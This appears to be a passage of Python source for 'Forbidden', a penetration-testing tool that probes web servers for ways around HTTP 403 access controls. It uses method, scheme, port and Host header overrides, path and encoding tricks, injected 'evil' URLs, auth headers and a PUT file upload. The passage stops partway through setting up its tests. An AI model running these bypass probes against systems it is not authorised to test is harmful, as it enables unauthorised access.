#!/usr/bin/env python3

import argparse, base64, colorama, concurrent.futures, copy, datetime, io, json, jwt, os, pycurl, random, regex as re, requests, socket, subprocess, sys, tabulate, tempfile, termcolor, threading, time, urllib.parse

colorama.init(autoreset = True)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# ----------------------------------------

class Stopwatch:

	def __init__(self):
		self.__start = datetime.datetime.now()

	def stop(self):
		self.__end = datetime.datetime.now()
		print(("Script has finished in {0}").format(self.__end - self.__start))

stopwatch = Stopwatch()

# ----------------------------------------

default_quotes = "'"

def escape_quotes(value):
	return str(value).replace(default_quotes, ("\\{0}").format(default_quotes))

def set_param(value, param = ""):
	value = default_quotes + escape_quotes(value) + default_quotes
	if param:
		value = ("{0} {1}").format(param, value)
	return value

# ----------------------------------------

def strip_url_scheme(url):
	return url.split("://", 1)[-1]

def strip_url_schemes(urls):
	tmp = []
	for url in urls:
		tmp.append(strip_url_scheme(url))
	return unique(tmp)

def get_base_https_url(scheme, dnp, port, full_path):
	return ("https://{0}:{1}{2}").format(dnp, port if scheme == "https" else 443, full_path)

def get_base_http_url(scheme, dnp, port, full_path):
	return ("http://{0}:{1}{2}").format(dnp, port if scheme == "http" else 80, full_path)

def get_all_domains(scheme, dnps, port): # NOTE: Extends domain names and IPs.
	if not isinstance(dnps, list):
		dnps = [dnps]
	tmp = []
	for dnp in dnps:
		tmp.extend([
			dnp,
			("{0}:{1}").format(dnp, port),
			("{0}://{1}").format(scheme, dnp),
			("{0}://{1}:{2}").format(scheme, dnp, port)
		])
	return unique(tmp)

def get_encoded_domains(dnp, port):
	tmp = [dnp, dnp.lower(), dnp.upper(), mix(dnp), urllib.parse.quote(unicode_encode(dnp))]
	for entry in tmp[0:-1]:
		tmp.append(hexadecimal_encode(entry))
		# NOTE: hexadecimal_encode(urllib.parse.quote(unicode_encode(dnp))) does not work
	for i in range(len(tmp)):
		tmp[i] = ("{0}:{1}").format(tmp[i], port)
	return unique(tmp)

# ----------------------------------------

path_const = "/"

def replace_multiple_slashes(path):
	return re.sub(r"\/{2,}", path_const, path)

def prepend_slash(path):
	if not path.startswith(path_const):
		path = path_const + path
	return path

def append_paths(bases, paths):
	if not isinstance(bases, list):
		bases = [bases]
	if not isinstance(paths, list):
		paths = [paths]
	tmp = []
	for base in bases:
		if base:
			for path in paths:
				tmp.append(base.rstrip(path_const) + prepend_slash(path) if path else base)
	return unique(tmp)

def extend_path(path, query_string = "", fragment = ""):
	tmp = []
	path = path.strip(path_const)
	if not path:
		tmp.append(path_const)
	else:
		tmp.extend([path_const + path + path_const, path + path_const, path_const + path, path])
	if query_string or fragment:
		for i in range(len(tmp)):
			tmp[i] = tmp[i] + query_string + fragment
	return unique(tmp)

def get_recursive_paths(path):
	end_no_const = ""
	end_const = path_const
	tmp = [end_no_const, end_const]
	for entry in path.strip(path_const).split(path_const):
		end_no_const += path_const + entry
		end_const += entry + path_const
		tmp.extend([end_no_const, end_const])
	return unique(tmp)

def get_encoded_paths(path):
	tmp = []
	if path == path_const:
		tmp.append(path_const)
	elif path:
		paths = path.strip(path_const).rsplit(path_const, 1)
		last = paths[-1]
		tmp.extend([last, last.lower(), last.upper(), mix(last), capitalize(last), urllib.parse.quote(unicode_encode(last))])
		for entry in tmp[0:-1]:
			tmp.append(hexadecimal_encode(entry))
			# NOTE: hexadecimal_encode(urllib.parse.quote(unicode_encode(last))) does not work
		prepend = path_const + paths[0] + path_const if len(paths) > 1 else path_const
		append = path_const if path.endswith(path_const) else ""
		for i in range(len(tmp)):
			tmp[i] = prepend + tmp[i] + append
	return unique(tmp)

# ----------------------------------------

def mix(string):
	tmp = ""
	upper = False
	for character in string:
		if character.isalpha():
			if character.isupper():
				upper = True
			break
	for character in string:
		if character.isalpha():
			character = character.lower() if upper else character.upper()
			upper = not upper
		tmp += character
	return tmp

def unicode_encode(string, case_sensitive = False):
	characters = {
		"a": "\u1d2c",
		"b": "\u1d2e",
		"d": "\u1d30",
		"e": "\u1d31",
		"g": "\u1d33",
		"h": "\u1d34",
		"i": "\u1d35",
		"j": "\u1d36",
		"k": "\u1d37",
		"l": "\u1d38",
		"m": "\u1d39",
		"n": "\u1d3a",
		"o": "\u1d3c",
		"p": "\u1d3e",
		"r": "\u1d3f",
		"t": "\u1d40",
		"u": "\u1d41",
		"w": "\u1d42",
		"1": "\u2460",
		"2": "\u2461",
		"3": "\u2462",
		"4": "\u2463",
		"5": "\u2464",
		"6": "\u2465",
		"7": "\u2466",
		"8": "\u2467",
		"9": "\u2468"
	}
	if case_sensitive:
		lower = string.lower()
		for key, value in characters.items():
			if key in lower:
				string = re.sub(key, value, string, flags = re.IGNORECASE)
	else:
		for key, value in characters.items():
			if key in string:
				string = string.replace(key, value)
	return string

def capitalize(string):
	tmp = ""
	changed = False
	for character in string.lower():
		if not changed and character.isalpha():
			character = character.upper()
			changed = True
		tmp += character
	return tmp

def hexadecimal_encode(string):
	tmp = ""
	for character in string:
		if character.isalpha() or character.isdigit():
			character = ("%{0}").format(format(ord(character), "x"))
		tmp += character
	return tmp

# ----------------------------------------

def print_white(text):
	termcolor.cprint(text, "white")

def print_cyan(text):
	termcolor.cprint(text, "cyan")

def print_red(text):
	termcolor.cprint(text, "red")

def print_yellow(text):
	termcolor.cprint(text, "yellow")

def print_green(text):
	termcolor.cprint(text, "green")

def print_time(text):
	print(("{0} - {1}").format(datetime.datetime.now().strftime("%H:%M:%S"), text))

default_encoding = "ISO-8859-1"

def b64(string):
	return base64.b64encode((string).encode(default_encoding)).decode(default_encoding)

def jdump(data):
	return json.dumps(data, indent = 4, ensure_ascii = False)

def pop(array, keys):
	for obj in array:
		for key in keys:
			obj.pop(key, None)
	return array

# ----------------------------------------

class uniquestr(str):
	__lower = None
	def __hash__(self):
		return id(self)
	def __eq__(self, other):
		return self is other
	def lower(self):
		if self.__lower is None:
			lower = str.lower(self)
			if str.__eq__(lower, self): 
				self.__lower = self
			else:
				self.__lower = uniquestr(lower)
		return self.__lower

# ----------------------------------------

def unique(sequence):
	seen = set()
	return [x for x in sequence if not (x in seen or seen.add(x))]

def read_file(file):
	tmp = []
	with open(file, "r", encoding = default_encoding) as stream:
		for line in stream:
			line = line.strip()
			if line:
				tmp.append(line)
	return unique(tmp)

def write_file(data, out):
	confirm = "yes"
	if os.path.isfile(out):
		print(("'{0}' already exists").format(out))
		confirm = input("Overwrite the output file (yes): ")
	if confirm.lower() == "yes":
		try:
			open(out, "w").write(data)
			print(("Results have been saved to '{0}'").format(out))
		except FileNotFoundError:
			print(("Cannot save results to '{0}'").format(out))

default_user_agent = "Forbidden/10.6"

def get_all_user_agents():
	tmp = []
	file = os.path.join(os.path.abspath(os.path.split(__file__)[0]), "user_agents.txt")
	if os.path.isfile(file) and os.access(file, os.R_OK) and os.stat(file).st_size > 0:
		with open(file, "r", encoding = default_encoding) as stream:
			for line in stream:
				line = line.strip()
				if line:
					tmp.append(line)
	return tmp if tmp else [default_agent]

def get_random_user_agent():
	tmp = get_all_user_agents()
	return tmp[random.randint(0, len(tmp) - 1)]

# ----------------------------------------

class Forbidden:

	def __init__(self, url, ignore_qsf, ignore_curl, tests, force, values, paths, evil, ignore, content_lengths, request_timeout, threads, sleep, user_agents, proxy, debug):
		# --------------------------------
		# NOTE: User-controlled input.
		self.__url             = self.__parse_url(url, ignore_qsf)
		self.__tests           = tests
		self.__force           = force
		self.__values          = values
		self.__accessible      = append_paths(self.__url["scheme_domain"], paths)
		self.__evil            = self.__parse_url(evil, ignore_qsf)
		self.__ignore          = ignore
		self.__content_lengths = content_lengths
		self.__threads         = threads
		self.__sleep           = sleep
		self.__user_agents     = user_agents
		self.__user_agents_len = len(self.__user_agents)
		self.__proxy           = proxy
		self.__debug           = debug
		# --------------------------------
		# NOTE: Python cURL configuration.
		self.__curl            = not ignore_curl
		self.__verify          = False # NOTE: Ignore SSL/TLS verification.
		self.__allow_redirects = True
		self.__max_redirects   = 10
		self.__connect_timeout = request_timeout
		self.__read_timeout    = request_timeout
		self.__encoding        = "UTF-8" # NOTE: ISO-8859-1 works better than UTF-8 when accessing files.
		self.__regex_flags     = re.MULTILINE | re.IGNORECASE
		# --------------------------------
		self.__error           = False
		self.__print_lock      = threading.Lock()
		self.__default_method  = "GET"
		self.__allowed_methods = []
		self.__collection      = []
		self.__identifier      = 0

	def __parse_url(self, url, ignore_qsf = False, case_sensitive = False):
		url      = urllib.parse.urlsplit(url)
		scheme   = url.scheme.lower()
		port     = int(url.port) if url.port else (443 if scheme == "https" else 80)
		domain   = url.netloc if url.port else ("{0}:{1}").format(url.netloc, port)
		domain   = domain.lower() if not case_sensitive else domain
		path     = replace_multiple_slashes(url.path)
		# --------------------------------
		query    = {}
		fragment = {}
		query["parsed"   ] = {} if ignore_qsf else urllib.parse.parse_qs(url.query, keep_blank_values = True)
		query["full"     ] = ("?{0}").format(urllib.parse.urlencode(query["parsed"], doseq = True)) if query["parsed"] else ""
		fragment["parsed"] = {} # NOTE: Not used.
		fragment["full"  ] = ("#{0}").format(url.fragment) if url.fragment else ""
		# --------------------------------
		tmp                        = {}
		tmp["scheme"             ] = scheme
		tmp["domain_no_port"     ] = domain.split(":", 1)[0]
		tmp["port"               ] = port
		tmp["domain"             ] = domain
		tmp["domain_extended"    ] = get_all_domains(tmp["scheme"], tmp["domain_no_port"], tmp["port"])
		# --------------------------------
		tmp["ip_no_port"         ] = None
		tmp["ip"                 ] = None
		tmp["ip_extended"        ] = None
		tmp["scheme_ip"          ] = None
		# --------------------------------
		tmp["scheme_domain"      ] = ("{0}://{1}").format(tmp["scheme"], tmp["domain"])
		tmp["path"               ] = path
		tmp["query"              ] = query
		tmp["fragment"           ] = fragment
		tmp["path_full"          ] = tmp["path"] + tmp["query"]["full"] + tmp["fragment"]["full"]
		# --------------------------------
		tmp["urls"               ] = {
			"base"  : tmp["scheme_domain"] + tmp["path_full"],
			"domain": {
				"https": get_base_https_url(tmp["scheme"], tmp["domain_no_port"], tmp["port"], tmp["path_full"]),
				"http" : get_base_http_url(tmp["scheme"], tmp["domain_no_port"], tmp["port"], tmp["path_full"])
			},
			"ip"    : {
				"https": None,
				"http" : None
			}
		}
		# --------------------------------
		tmp["relative_paths"     ] = extend_path(tmp["path"]) + extend_path(tmp["path"], tmp["query"]["full"], tmp["fragment"]["full"])
		tmp["absolute_paths"     ] = append_paths(("{0}://{1}").format(tmp["scheme"], tmp["domain_no_port"]), tmp["relative_paths"]) + append_paths(tmp["scheme_domain"], tmp["relative_paths"])
		# --------------------------------
		for key in tmp:
			if isinstance(tmp[key], list):
				tmp[key] = unique(tmp[key])
		return tmp
		# --------------------------------

	def __parse_ip(self, obj):
		try:
			obj["ip_no_port" ] = socket.gethostbyname(obj["domain_no_port"])
			obj["ip"         ] = ("{0}:{1}").format(obj["ip_no_port"], obj["port"])
			obj["ip_extended"] = get_all_domains(obj["scheme"], obj["ip_no_port"], obj["port"])
			obj["scheme_ip"  ] = ("{0}://{1}").format(obj["scheme"], obj["ip"])
			obj["urls"]["ip" ] = {
				"https": get_base_https_url(obj["scheme"], obj["ip_no_port"], obj["port"], obj["path_full"]),
				"http" : get_base_http_url(obj["scheme"], obj["ip_no_port"], obj["port"], obj["path_full"])
			}
		except socket.error as ex:
			self.__print_debug(ex)
		return obj

	def __add_content_lengths(self, content_lengths):
		if not isinstance(content_lengths, list):
			content_lengths = [content_lengths]
		self.__content_lengths = unique(self.__content_lengths + content_lengths)

	def get_results(self):
		return self.__collection

	def __print_error(self, text):
		self.__error = True
		print_red(("ERROR: {0}").format(text))

	def __print_debug(self, error, text = ""):
		if self.__debug:
			with self.__print_lock:
				if text:
					print_yellow(text)
				print_cyan(error)

	def __encode(self, values):
		if isinstance(values, list):
			return [value.encode(self.__encoding) for value in values]
		else:
			return values.encode(self.__encoding)

	def __decode(self, values):
		if isinstance(values, list):
			return [value.decode(self.__encoding) for value in values]
		else:
			return values.decode(self.__encoding)

	def run(self):
		self.__validate_inaccessible_and_evil_urls()
		if not self.__error:
			self.__fetch_inaccessible_and_evil_ips()
			if not self.__error:
				self.__validate_accessible_urls()
				self.__set_allowed_http_methods()
				self.__prepare_collection()
				if not self.__collection:
					print("No test records were created")
				else:
					self.__filter_collection()
					print_cyan(("Number of created test records: {0}").format(len(self.__collection)))
					self.__run_tests()
					self.__validate_results()

	def __validate_inaccessible_and_evil_urls(self):
		# --------------------------------
		print_cyan(("Normalized inaccessible URL: {0}").format(self.__url["urls"]["base"]))
		print_time(("Validating the inaccessible URL using HTTP {0} method...").format(self.__force if self.__force else self.__default_method))
		record = self.__fetch(url = self.__url["urls"]["base"], method = self.__force if self.__force else self.__default_method)
		if not (record["code"] > 0):
			self.__print_error("Cannot validate the inaccessible URL, script will exit shortly...")
		elif "base" in self.__content_lengths:
			print_green(("Ignoring the inaccessible URL response content length: {0}").format(record["length"]))
			self.__content_lengths.pop(self.__content_lengths.index("base"))
			self.__add_content_lengths(record["length"])
		# --------------------------------
		if not self.__error and self.__check_tests(["headers", "auths", "redirects", "parsers", "all"]):
			print_cyan(("Normalized evil URL: {0}").format(self.__evil["urls"]["base"]))
			print_time(("Validating the evil URL using HTTP {0} method...").format(self.__default_method))
			record = self.__fetch(url = self.__evil["urls"]["base"], method = self.__default_method)
			if not (record["code"] > 0):
				self.__print_error("Cannot validate the evil URL, script will exit shortly...")
		# --------------------------------

	def __fetch_inaccessible_and_evil_ips(self):
		# --------------------------------
		print_time("Fetching the IP of inaccessible URL...")
		self.__url = self.__parse_ip(copy.deepcopy(self.__url))
		if not self.__url["ip_no_port"]:
			self.__print_error("Cannot fetch the IP of inaccessible URL, script will exit shortly...")
		# --------------------------------
		if not self.__error and self.__check_tests(["headers", "auths", "redirects", "parsers", "all"]):
			print_time("Fetching the IP of evil URL...")
			self.__evil = self.__parse_ip(copy.deepcopy(self.__evil))
			if not self.__evil["ip_no_port"]:
				self.__print_error("Cannot fetch the IP of evil URL, script will exit shortly...")
		# --------------------------------

	# NOTE: Select only the first valid accessible URL.
	def __validate_accessible_urls(self):
		if self.__check_tests(["headers", "all"]):
			print_time(("Validating the accessible URLs using HTTP {0} method...").format(self.__default_method))
			for url in copy.deepcopy(self.__accessible):
				self.__accessible = ""
				record = self.__fetch(url = url, method = self.__default_method)
				if record["code"] >= 200 and record["code"] < 400:
					print_green(("First valid accessible URL: {0}").format(record["url"]))
					self.__accessible = record["url"]
					if "path" in self.__content_lengths:
						print_green(("Ignoring the accessible URL response content length: {0}").format(record["length"]))
						self.__content_lengths.pop(self.__content_lengths.index("path"))
						self.__add_content_lengths(record["length"])
					break
			if not self.__accessible:
				print_cyan("No valid accessible URLs were found, moving on...")

	def __set_allowed_http_methods(self):
		# --------------------------------
		if self.__force:
			print_cyan(("Forcing HTTP {0} method for all non-specific test cases...").format(self.__force))
			self.__allowed_methods = [self.__force]
		# --------------------------------
		elif self.__check_tests(["methods", "method-overrides", "all"]):
			print_time("Fetching allowed HTTP methods...")
			record = self.__fetch(url = self.__url["urls"]["base"], method = "OPTIONS")
			if record["code"] > 0:
				if record["curl"]:
					methods = re.search(r"(?<=^allow\:).+", record["response_headers"], self.__regex_flags)
					if methods:
						for method in methods[0].split(","):
							method = method.strip().upper()
							if method not in self.__allowed_methods:
								self.__allowed_methods.append(method)
				else:
					for key in record["response_headers"]:
						if key.lower() == "allow":
							for method in record["response_headers"][key].split(","):
								method = method.strip().upper()
								if method not in self.__allowed_methods:
									self.__allowed_methods.append(method)
							break
			if not self.__allowed_methods:
				print_cyan("Cannot fetch allowed HTTP methods, moving on...")
				self.__allowed_methods = self.__get_methods()
				# TO DO: Brute-force allowed HTTP methods.
			else:
				print_green(("Allowed HTTP methods: [{0}]").format((", ").join(self.__allowed_methods)))
		# --------------------------------

	def __fetch(self, url, method = None, headers = None, body = None, user_agent = None, proxy = None, curl = None, passthrough = True):
		record = self.__record("SYSTEM-0", url, method, headers, body, user_agent, proxy, curl)
		return self.__send_curl(record, passthrough) if record["curl"] else self.__send_request(record, passthrough)

	def __records(self, identifier, urls, methods = None, headers = None, body = None, user_agent = None, proxy = None, curl = None):
		if not isinstance(urls, list):
			urls = [urls]
		if not isinstance(methods, list):
			methods = [methods]
		if headers:
			for url in urls:
				for method in methods:
					for header in headers:
						if not isinstance(header, list):
							# NOTE: Python cURL accepts only string arrays as HTTP request headers.
							header = [header]
						self.__collection.append(self.__record(identifier, url, method, header, body, user_agent, proxy, curl))
		else:
			for url in urls:
				for method in methods:
					self.__collection.append(self.__record(identifier, url, method, [], body, user_agent, proxy, curl))

	def __record(self, identifier, url, method, headers, body, user_agent, proxy, curl):
		self.__identifier += 1
		identifier = ("{0}-{1}").format(self.__identifier, identifier)
		if not method:
			method = self.__force if self.__force else self.__default_method
		if not user_agent:
			user_agent = self.__user_agents[random.randint(0, self.__user_agents_len - 1)] if self.__user_agents_len > 1 else self.__user_agents[0]
		if not proxy:
			proxy = self.__proxy
		if not curl:
			curl = self.__curl
		record = {
			"raw"             : self.__identifier,
			"id"              : identifier,
			"url"             : url,
			"method"          : method,
			"headers"         : headers,
			"body"            : body,
			"user_agent"      : user_agent,
			"proxy"           : proxy,
			"command"         : None,
			"code"            : 0,
			"length"          : 0,
			"response"        : None,
			"response_headers": None,
			"curl"            : curl
		}
		record["command"] = self.__build_command(record)
		return record

	def __build_command(self, record):
		tmp = ["curl", ("--connect-timeout {0}").format(self.__connect_timeout), ("-m {0}").format(self.__read_timeout), "-iskL", ("--max-redirs {0}").format(self.__max_redirects), "--path-as-is"]
		if record["body"]:
			tmp.append(set_param(record["body"], "-d"))
		if record["proxy"]:
			tmp.append(set_param(record["proxy"], "-x"))
		if record["user_agent"]:
			tmp.append(set_param(record["user_agent"], "-A"))
		if record["headers"]:
			for header in record["headers"]:
				tmp.append(set_param(header, "-H"))
		tmp.append(set_param(record["method"], "-X"))
		tmp.append(set_param(record["url"]))
		tmp = (" ").join(tmp)
		return tmp

	# NOTE: Remove duplicate test records.
	def __filter_collection(self):
		tmp = []
		exists = set()
		for record in self.__collection:
			command = re.sub((" -A \\{0}.+?\\{0}").format(default_quotes), "", record["command"])
			if command not in exists and not exists.add(command):
				tmp.append(record)
		self.__collection = tmp

	def __run_tests(self):
		results = []
		print_time(("Running tests with {0} engine...").format("PycURL" if self.__curl else "Python Requests"))
		print("Press CTRL + C to exit early - results will be saved")
		progress = Progress(len(self.__collection), self.__print_lock)
		progress.show()
		with concurrent.futures.ThreadPoolExecutor(max_workers = self.__threads) as executor:
			subprocesses = []
			try:
				for record in self.__collection:
					subprocesses.append(executor.submit(self.__send_curl if record["curl"] else self.__send_request, record))
				for subprocess in concurrent.futures.as_completed(subprocesses):
					results.append(subprocess.result())
					progress.show()
			except KeyboardInterrupt:
				executor.shutdown(wait = True, cancel_futures = True)
		self.__collection = results

	def __send_curl(self, record, passthrough = False):
		if self.__sleep:
			time.sleep(self.__sleep)
		curl = None
		cookiefile = None
		headers = None
		response = None
		try:
			# ----------------------------
			curl = pycurl.Curl()
			# ----------------------------
			cookiefile = tempfile.NamedTemporaryFile(mode = "r") # NOTE: Important! Store and pass HTTP cookies on HTTP redirects.
			curl.setopt(pycurl.COOKIESESSION, True)
			curl.setopt(pycurl.COOKIEFILE, cookiefile.name)
			curl.setopt(pycurl.COOKIEJAR, cookiefile.name)
			# ----------------------------
			if passthrough:
				headers = io.BytesIO()
				curl.setopt(pycurl.HEADERFUNCTION, headers.write)
			# ----------------------------
			response = io.BytesIO()
			curl.setopt(pycurl.WRITEFUNCTION, response.write)
			# ----------------------------
			curl.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_1)
			curl.setopt(pycurl.VERBOSE, False)
			curl.setopt(pycurl.PATH_AS_IS, True)
			curl.setopt(pycurl.SSL_VERIFYHOST, self.__verify)
			curl.setopt(pycurl.SSL_VERIFYPEER, self.__verify)
			curl.setopt(pycurl.PROXY_SSL_VERIFYHOST, self.__verify)
			curl.setopt(pycurl.PROXY_SSL_VERIFYPEER, self.__verify)
			curl.setopt(pycurl.FOLLOWLOCATION, self.__allow_redirects)
			curl.setopt(pycurl.MAXREDIRS, self.__max_redirects)
			curl.setopt(pycurl.CONNECTTIMEOUT, self.__connect_timeout)
			curl.setopt(pycurl.TIMEOUT, self.__read_timeout)
			# ----------------------------
			# NOTE: Important! Encode Unicode characters.
			curl.setopt(pycurl.URL, record["url"])
			curl.setopt(pycurl.CUSTOMREQUEST, record["method"])
			if record["method"] in ["HEAD"]:
				curl.setopt(pycurl.NOBODY, True)
			if record["user_agent"]:
				curl.setopt(pycurl.USERAGENT, self.__encode(record["user_agent"]))
			if record["headers"]:
				curl.setopt(pycurl.HTTPHEADER, self.__encode(record["headers"])) # Will override 'User-Agent' HTTP request header.
			if record["body"]:
				curl.setopt(pycurl.POSTFIELDS, record["body"])
			if record["proxy"]:
				curl.setopt(pycurl.PROXY, record["proxy"])
			# ----------------------------
			curl.perform()
			# ----------------------------
			record["code"] = int(curl.getinfo(pycurl.RESPONSE_CODE))
			record["length"] = int(curl.getinfo(pycurl.SIZE_DOWNLOAD))
			if passthrough:
				record["response_headers"] = self.__decode(headers.getvalue())
				# record["response"] = self.__decode(response.getvalue())
			elif record["length"] in self.__content_lengths or (self.__ignore and re.search(self.__ignore, self.__decode(response.getvalue()), self.__regex_flags)):
				record["code"] = -1
			# ----------------------------
		except pycurl.error as ex:
			# ----------------------------
			self.__print_debug(ex, ("{0}: {1}").format(record["id"], record["command"]))
			# ----------------------------
		finally:
			# ----------------------------
			if response:
				response.close()
			# ----------------------------
			if headers:
				headers.close()
			# ----------------------------
			if curl:
				curl.close()
			# ----------------------------
			if cookiefile:
				cookiefile.close() # NOTE: Important! Close the file handle strictly after closing the cURL handle.
			# ----------------------------
		return record

	def __send_request(self, record, passthrough = False):
		if self.__sleep:
			time.sleep(self.__sleep)
		session = None
		response = None
		try:
			# ----------------------------
			session = requests.Session()
			session.max_redirects = self.__max_redirects
			# ----------------------------
			session.cookies.clear()
			# ----------------------------
			request = requests.Request(
				record["method"],
				record["url"]
			)
			if record["user_agent"]:
				request.headers["User-Agent"] = self.__encode(record["user_agent"])
			if record["headers"]:
				self.__set_double_headers(request, record["headers"]) # Will override 'User-Agent' HTTP request header.
			if record["body"]:
				request.data = record["body"]
			if record["proxy"]:
				session.proxies["https"] = session.proxies["http"] = record["proxy"]
			# ----------------------------
			prepared = session.prepare_request(request)
			prepared.url = record["url"]
			# ----------------------------
			response = session.send(
				prepared,
				verify = self.__verify,
				allow_redirects = self.__allow_redirects,
				timeout = (self.__connect_timeout, self.__read_timeout)
			)
			# ----------------------------
			record["code"] = int(response.status_code)
			record["length"] = len(response.content)
			if passthrough:
				record["response_headers"] = dict(response.headers)
				# record["response"] = self.__decode(response.content)
			elif record["length"] in self.__content_lengths or (self.__ignore and re.search(self.__ignore, self.__decode(response.content), self.__regex_flags)):
				record["code"] = -1
			# ----------------------------
		except (requests.packages.urllib3.exceptions.LocationParseError, requests.exceptions.RequestException) as ex:
			# ----------------------------
			self.__print_debug(ex, ("{0}: {1}").format(record["id"], record["command"]))
			# ----------------------------
		finally:
			# ----------------------------
			if response:
				response.close()
			# ----------------------------
			if session:
				session.close()
			# ----------------------------
		return record

	def __set_double_headers(self, request, headers):
		exists = set()
		for header in headers:
			array = header.split(":", 1)
			key = array[0].rstrip(";")
			value = self.__encode(array[1].strip() if len(array) > 1 else "")
			request.headers[key if key not in exists and not exists.add(key) else uniquestr(key)] = value

	def __validate_results(self):
		tmp = []
		# --------------------------------
		print_time("Validating results...")
		table = Table(self.__collection) # unfiltered
		# --------------------------------
		self.__collection = pop(sorted([record for record in self.__collection if record["code"] > 0], key = lambda x: (x["code"], -x["length"], x["raw"])), ["raw", "proxy", "response_headers", "response", "curl"])
		# --------------------------------
		for record in self.__collection:
			if record["code"] >= 500:
				continue
				print_cyan(jdump(record))
				tmp.append(record)
			elif record["code"] >= 400:
				continue
				print_red(jdump(record))
				tmp.append(record)
			elif record["code"] >= 300:
				# continue
				print_yellow(jdump(record))
				tmp.append(record)
			elif record["code"] >= 200:
				# continue
				print_green(jdump(record))
				tmp.append(record)
			elif record["code"] > 0:
				continue
				print_white(jdump(record))
				tmp.append(record)
		# --------------------------------
		self.__collection = tmp
		table.show()

	def __check_tests(self, array):
		return any(test in array for test in self.__tests)

	def __prepare_collection(self):
		print_time("Preparing test records...")
		# --------------------------------
		if self.__check_tests(["base", "all"]):
			# NOTE: Test both, HTTP and HTTPS requests on both, domain name and IP.
			self.__records(
				identifier = "BASE-1",
				urls       = unique([
					self.__url["urls"]["domain"]["https"],
					self.__url["urls"]["domain"]["http"],
					self.__url["urls"]["ip"]["https"],
					self.__url["urls"]["ip"]["http"]
				])
			)
		# --------------------------------
		if self.__check_tests(["methods", "all"]):
			# NOTE: Test allowed HTTP methods.
			self.__records(
				identifier = "METHODS-1",
				urls       = self.__url["urls"]["base"],
				methods    = self.__allowed_methods
			)
			# NOTE: Test allowed HTTP methods with 'Content-Length: 0' HTTP request header.
			self.__records(
				identifier = "METHODS-2",
				urls       = self.__url["urls"]["base"],
				methods    = self.__allowed_methods,
				headers    = ["Content-Length: 0"]
			)
			# NOTE: Test cross-site tracing (XST) with HTTP TRACE and TRACK methods.
			# NOTE: To confirm the vulnerability, check if 'XSTH: XSTV' HTTP response header is returned.
			self.__records(
				identifier = "METHODS-3",
				urls       = self.__url["urls"]["base"],
				methods    = ["TRACE", "TRACK"],
				headers    = ["XSTH: XSTV"]
			)
			# NOTE: Test [text] file upload with HTTP PUT method.
			# NOTE: Semi-colon in 'Content-Type;' will expand to an empty HTTP request header.
			self.__records(
				identifier = "METHODS-4",
				urls       = self.__get_file_upload_urls(files = ["/pentest.txt"]),
				methods    = ["PUT"],
				headers    = ["Content-Type;", "Content-Type: text/plain"],
				body       = "pentest"
			)
		# --------------------------------
		if self.__check_tests(["method-overrides", "all"]):
			# NOTE: Test HTTP method overrides with HTTP request headers.
			self.__records(
				identifier = "METHOD-OVERRIDES-1",
				urls       = self.__url["urls"]["base"],
				methods    = self.__allowed_methods,
				headers    = self.__get_method_override_headers()
			)
			# NOTE: Test HTTP method overrides with URL query string parameters.
			self.__records(
				identifier = "METHOD-OVERRIDES-2",
				urls       = self.__get_method_override_urls(),
				methods    = self.__allowed_methods
			)
		# --------------------------------
		if self.__check_tests(["scheme-overrides", "all"]):
			# NOTE: Test URL scheme overrides, HTTPS to HTTP.
			self.__records(
				identifier = "SCHEME-OVERRIDES-1",
				urls       = self.__url["urls"]["domain"]["https"],
				headers    = self.__get_scheme_override_headers("http")
			)
			# NOTE: Test URL scheme overrides, HTTP to HTTPS.
			self.__records(
				identifier = "SCHEME-OVERRIDES-2",
				urls       = self.__url["urls"]["domain"]["http"],
				headers    = self.__get_scheme_override_headers("https")
			)
		# --------------------------------
		if self.__check_tests(["port-overrides", "all"]):
			# NOTE: Test port overrides.
			self.__records(
				identifier = "PORT-OVERRIDES-1",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_port_override_headers()
			)
		# --------------------------------
		if self.__check_tests(["headers", "all"]):
			# NOTE: Test information disclosure with 'Accept' HTTP request header.
			self.__records(
				identifier = "HEADERS-1",
				urls       = self.__url["urls"]["base"],
				headers    = ["Accept: application/json,text/javascript,*/*;q=0.01"]
			)
			# NOTE: Test HTTP request headers.
			self.__records(
				identifier = "HEADERS-2",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_url_headers(self.__url["relative_paths"] + self.__url["absolute_paths"] + self.__get_all_values(scheme = True, ip = False))
			)
			# NOTE: Test HTTP request headers.
			self.__records(
				identifier = "HEADERS-3",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_ip_headers(self.__get_all_values(scheme = False, ip = False) + self.__get_all_values(scheme = False, ip = True))
			)
			# NOTE: Test HTTP request headers.
			self.__records(
				identifier = "HEADERS-4",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_special_headers()
			)
			# NOTE: Test HTTP request headers.
			if self.__values:
				self.__records(
					identifier = "HEADERS-5",
					urls       = self.__url["urls"]["base"],
					headers    = self.__get_all_headers(self.__values)
				)
			# NOTE: Test URL override with domain name.
			self.__records(
				identifier = "HEADERS-6",
				urls       = self.__url["scheme_domain"],
				headers    = self.__get_url_headers(self.__url["relative_paths"] + self.__url["absolute_paths"])
			)
			# NOTE: Test URL override with accessible URL.
			if self.__accessible:
				self.__records(
					identifier = "HEADERS-7",
					urls       = self.__accessible,
					headers    = self.__get_url_headers(self.__url["relative_paths"] + self.__url["absolute_paths"])
				)
			# NOTE: Test HTTP host override with double 'Host' HTTP request headers.
			self.__records(
				identifier = "HEADERS-8",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_double_host_header(ip = False) + self.__get_double_host_header(ip = True),
				curl       = False
			)
		# --------------------------------
		if self.__check_tests(["paths", "all"]):
			# NOTE: Test URL path bypasses.
			self.__records(
				identifier = "PATHS-1",
				urls       = self.__get_path_bypass_urls()
			)
		# --------------------------------
		if self.__check_tests(["encodings", "all"]):
			# NOTE: Test domain name and URL path transformations and encodings.
			self.__records(
				identifier = "ENCODINGS-1",
				urls       = self.__get_encoded_urls(),
				curl       = True
			)
			# TO DO: Extend to HTTP request headers.
		# --------------------------------
		if self.__check_tests(["auths", "all"]):
			# NOTE: Test basic authentication/authorization.
			self.__records(
				identifier = "AUTHS-1",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_basic_auth_headers()
			)
			# NOTE: Test bearer authentication/authorization.
			self.__records(
				identifier = "AUTHS-2",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_bearer_auth_headers()
			)
		# --------------------------------
		if self.__check_tests(["redirects", "all"]):
